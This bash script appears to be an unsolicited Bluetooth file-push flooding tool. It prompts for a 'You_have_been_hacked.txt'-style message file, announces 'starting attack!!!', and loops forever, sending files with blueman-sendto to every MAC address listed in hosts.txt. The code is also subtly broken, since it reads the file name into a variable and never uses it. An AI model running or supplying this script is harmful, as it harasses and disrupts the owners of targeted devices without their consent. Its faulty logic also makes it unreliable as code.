#!/bin/bash

echo "╭─""Write the full message you maked with file extension (Example: You_have_been_hacked.txt) (-_-) "
                           read -p " ╰─$ " msg

echo starting attack!!!

while :
do
while read -r mac; do
blueman-sendto -d "$mac" .txt &
done < hosts.txt
wait
done
